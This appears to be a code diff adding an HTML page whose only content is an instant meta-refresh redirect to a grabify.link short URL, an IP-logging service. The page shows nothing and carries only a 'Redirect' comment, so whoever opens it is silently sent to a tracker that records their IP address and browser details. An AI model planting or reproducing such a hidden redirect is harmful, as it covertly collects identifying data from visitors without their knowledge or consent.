@@ -1,0 +1,10 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    
+    <!-- Redirect -->
+    <meta http-equiv="refresh" content="0; url=https://grabify.link/TIZB0L" />
+  </head>
+  <body>
+  </body>
+</html>
